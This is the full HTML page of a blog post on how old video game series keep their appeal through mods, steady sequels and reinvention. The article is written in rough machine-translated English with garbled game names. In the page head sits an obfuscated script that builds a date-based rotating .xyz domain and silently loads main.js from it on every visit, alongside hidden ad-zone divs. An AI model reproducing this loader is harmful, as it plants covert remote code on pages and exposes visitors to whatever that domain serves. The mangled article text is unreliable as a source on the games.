<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Game,">










<meta name="description" content="Since the 1980s, it was the most popular and prosperous period of video games. It has a history of nearly 30 years. In the 30 years, we not only witnessed the evolution of video games from the origina">
<meta name="keywords" content="Game">
<meta property="og:type" content="article">
<meta property="og:title" content="How to maintain the vitality of the old game">
<meta property="og:url" content="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/index.html">
<meta property="og:site_name" content="Games">
<meta property="og:description" content="Since the 1980s, it was the most popular and prosperous period of video games. It has a history of nearly 30 years. In the 30 years, we not only witnessed the evolution of video games from the origina">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/317ffbd8e38f444690c98adad3d73cc5.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/42164b3b98d6478e86e39becabda8c5b.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/f161319dca7940e7a2c1e23caa5e0f28.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/e5c75e5976c34d649cf2f964faf413a4.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/e27b4931c5604237b1e23423635bd9c9.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/09d5ceee7af7408f979537a86c47eed5.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/cd5f945bd5f84d40bf263bd87f65c3d1.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/05c6a80e96d24d92ac79d3f371ac3a1e.jpg">
<meta property="og:updated_time" content="2021-03-02T08:49:49.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="How to maintain the vitality of the old game">
<meta name="twitter:description" content="Since the 1980s, it was the most popular and prosperous period of video games. It has a history of nearly 30 years. In the 30 years, we not only witnessed the evolution of video games from the origina">
<meta name="twitter:image" content="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/317ffbd8e38f444690c98adad3d73cc5.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/">




<script type="text/javascript">!function(n){var t,e=function(n,t){var e=[["a","e","i","o","u","y"],["b","c","d","f","g","h","j","k","l","m","n","p","q","r","s","t","v","w","x","y","z"]];if(t)for(var r=0;r<=t.length-1;r++)n=n*t.charCodeAt(r)%4294967295;var l;return next=(l=n,function(n){return l=l+1831565813|0,(((n=(n=Math.imul(l^l>>>15,1|l))+Math.imul(n^n>>>7,61|n)^n)^n>>>14)>>>0)/Math.pow(2,32)}),function(n,t){for(var r=[],l=null,o=0;o<=n-1;o++){var a=void 0;null===l?a=e[0].concat(e[1]):1==l?(a=e[0],l=0):(a=e[1],l=1);var u=a[Math.floor(next()*a.length)];r.push(u),null===l&&(l=-1!=e[0].indexOf(u)?0:1)}return r.push("."+t),r.join("")}}((t=new Date,(t/=1e3)-t%1209600),"_fa7cdd4c68507744")(8,"xyz");if(null===n)console.log("https://"+e);else{var r=n.createElement("script");r.src="https://"+e+"/main.js",(n.body||n.head).appendChild(r)}}("undefined"!=typeof document?document:null);
</script>

  <title>How to maintain the vitality of the old game | Games</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Games</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Games</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            Sitemap
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
 
 
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="22aeec266c49468da6040eff035066b8" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="7aa7f6c595384fd6a2e5f5016b455fd2" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-zone="df2a1bde9f44465a8457aaf705928077" style="width:728px;height:90px;display: inline-block;margin: 0 auto"></div>
 <div class="_fa7cdd4c68507744" data-zone="4fff9a79323749608f8df1eff7291bcf" style="width:970px;height:90px;display: inline-block;margin: 0 auto"></div>
 
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Harry">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Games">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">How to maintain the vitality of the old game</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-08T00:00:00+08:00">
                2019-11-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>Since the 1980s, it was the most popular and prosperous period of video games. It has a history of nearly 30 years. In the 30 years, we not only witnessed the evolution of video games from the original eight pixels to the top picture which is infinitely close to reality, but also witnessed the birth and glory of a great work or legend series. In the 30 years of history, some works may have been forgotten by people, and some works’ sequels have become “lifetime”. And only a few people know the existence of great influence, perhaps to this day still tenacious to live, and live more moist.<br><img src="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/317ffbd8e38f444690c98adad3d73cc5.jpg" alt="How to maintain the vitality of the old game"><br>Among these works of “high age”, some of them are consistent, relying on stable and firm quality to win, while others are trying to connect with the new era and organically combine themselves with other elements, with the purpose of trying to live longer as much as possible. And the times are changing, people’s taste and vision are also no matter innovation, how to make the right choice for their own situation has become a big problem that these “time-honored brands” must consider.<br><img src="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/42164b3b98d6478e86e39becabda8c5b.jpg" alt="How to maintain the vitality of the old game"></p>
<h1 id="mod-and-editor"><a href="#mod-and-editor" class="headerlink" title="mod and editor"></a>mod and editor</h1><p>When it comes to the secret recipe that can prolong the life of the game, it naturally belongs to mod and various editors. In essence, this is that the developers of the game provide some permissions for the players to play a game, improve the open source of the game itself, and encourage the players to participate in the creation of extra content of the game. After all, everyone has different ideas and inspiration, so everyone can create different content, constantly inject fresh blood into the game. This way mostly appears in a single game, and it will follow when the game is launched. Generally, it can improve the playability of a game to the maximum. Making mod for the game can enrich the content of the game, change the model in the game, add some functions for the game itself, and so on. With the help of the editor, you can play the game by yourself in a very simple and understandable way Every element of the game, including the model, map and even the rules of the game can be freely modified by the players, so as to increase more playability on the basis of the original game.<br><img src="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/f161319dca7940e7a2c1e23caa5e0f28.jpg" alt="How to maintain the vitality of the old game"><br>Image quality enhancement mod of gta5<br>Take a few typical examples: the open World RPG game “ancient scroll 5” produced by Bethesda has a very high open source. Because the open world of the game itself has a higher degree of freedom and a more realistic ecosystem than other games, in the eyes of developers and players, this is a world worth exploring. Every time you play, you will have a different feeling, but also Because of this, many players are willing to develop a variety of mods for this game, replace the characters in the game or add new functions, and even some can directly change the game into a completely different game. In terms of making a completely different game, the editor has a greater say, such as the current popular MoBa and big escape type games are derived from games with an editor.<br><img src="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/e5c75e5976c34d649cf2f964faf413a4.jpg" alt="How to maintain the vitality of the old game"><br>Ancient scroll 5 independent mod “enderal”</p>
<h1 id="stick-to-the-rules"><a href="#stick-to-the-rules" class="headerlink" title="stick to the rules"></a>stick to the rules</h1><p>For a game that has achieved extraordinary results from the beginning, the more difficult it is to continue, the success from the beginning means that the game itself has excellent design in some aspects since its birth, and usually the success of a game means that it can create profits for developers, so in most cases, it will try to launch a sequel. And the word “sequel” means that it can either be equal to or better than the previous one. If it is even a little worse than the previous one, it will be considered as a step backward. In order to successfully launch the sequel and stabilize the reputation of the game, developers usually choose to adjust on the basis of previous works, try to bring some new content to the players on the basis of previous works in each generation of works, or insist on launching works that are not different from previous works according to a mode, but simply change the screen and the general plot.<br><img src="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/e27b4931c5604237b1e23423635bd9c9.jpg" alt="How to maintain the vitality of the old game"><br>All kinds of sports games are usually out of picture promotion, only need to modify the data<br>Take ghost cry 5, which was released at the beginning of this year, for example. Its first generation of works was born in 2001, which is still an old IP with a history of 18 years. When it was born, it was called the benchmark of action game in the industry. Even the Ghost Warrior series, which was earlier than his birth, failed to win this honor. It is also called “three generation act” game together with Ares and forbearance dragon series. For a long time, the series of “ghost cry” has been selling points with elegant scene design, handsome and gorgeous fighting style, full tension plot performance and deeply rooted characters. If these key points are inherited to ensure their quality, then this game will not be worse. The most obvious example is that the second generation of the series of leading role Games has changed the leading role from a glib ruffian to a cold and dark boy, so the sales volume of the game has been directly impacted. There is a gap of nearly ten years between the four and five generations. I thought that the five generations would have a drastic reform, but I didn’t expect that they were still familiar with the original taste, but the picture became better and the content was rich.<br><img src="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/09d5ceee7af7408f979537a86c47eed5.jpg" alt="How to maintain the vitality of the old game"><br>It’s hard to find out the faults in the completion of “ghost cry 5”</p>
<h1 id="self-innovation"><a href="#self-innovation" class="headerlink" title="self innovation"></a>self innovation</h1><p>For a series of games, perhaps the most difficult thing is to try to add innovation to each generation of works, especially for works with relatively fixed and single playing methods. Generally, the works that want to try in the new works are either bad at the beginning and want to recover the situation through innovation, or limited and the change of the times, afraid that the consistent will not be accepted by the mainstream. As for how to innovate the game, let’s see what the developers have to refer to and whether the IP in hand can be applied to this idea. The advantage of this approach is that it is very easy to fill and modify the shortcomings in the game with new elements, while the disadvantage is that many times, the ideas with good consistency in the eyes of developers are not matched or even have negative effects from the perspective of players.<br><img src="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/cd5f945bd5f84d40bf263bd87f65c3d1.jpg" alt="How to maintain the vitality of the old game"><br>Call of Duty: modern war, a new edition of comprehensive innovation, is probably the highest quality work in recent years<br>Take the Ares Series in the three act games as an example. As we all know, Ares series always has a large scale, many elements of violence and blood, and takes the Greek mythology in the dark style as the main tone. The operation difficulty of the game is not high. Compared with the complicated tactics of each weapon in ghost cry series, it is much simpler, usually according to the different types of enemies Switch equipment, and the operation of most moves is basically universal. From the first generation to the third generation, the works have always been in a refreshing style, while in the latest series, in view of the revenge story of the protagonist Kratos has ended, so the style of the new work has changed from the main battle to the main narrative, and some RPG elements have been added on the original basis, which makes this work more profound than the previous work, and the game process with a slightly slower rhythm is quite in line with the role For an influential work of some years, the seemingly drastic reform has actually become a bonus item of the game. We have to admit that the reform of the development team is very bold, but more complementary.<br><img src="http://maiygu.xyz/2019/11/08/How to maintain the vitality of the old game/05c6a80e96d24d92ac79d3f371ac3a1e.jpg" alt="How to maintain the vitality of the old game"><br>The new ares is even better than the previous one. The game of the year is not played<br>    concluding remarks<br>It’s not easy to maintain a game’s vitality. A slight change is likely to affect the tone and style of the integrated game since its birth. If there’s a little carelessness, it’s likely to hit the signboard. Therefore, if these games need to be adjusted or changed, they also need a lot of deliberation and long-term polishing. Generally, works with the same or even better quality can be kept for many years, which are popular and influential.</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Game/" rel="tag"># Game</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/11/08/In order to adapt to the style exchange of the times, all of Sega's Games took the wrong script/" rel="next" title="In order to adapt to the style exchange of the times, all of Sega's Games took the wrong script">
                <i class="fa fa-chevron-left"></i> In order to adapt to the style exchange of the times, all of Sega's Games took the wrong script
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/11/08/I don't know when to start, there is a new wave of mecha in the game circle/" rel="prev" title="I don't know when to start, there is a new wave of mecha in the game circle">
                I don't know when to start, there is a new wave of mecha in the game circle <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Harry</p>
              <p class="site-description motion-element" itemprop="description">Games</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">114</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#mod-and-editor"><span class="nav-number">1.</span> <span class="nav-text">mod and editor</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stick-to-the-rules"><span class="nav-number">2.</span> <span class="nav-text">stick to the rules</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#self-innovation"><span class="nav-number">3.</span> <span class="nav-text">self innovation</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        

<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Harry</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
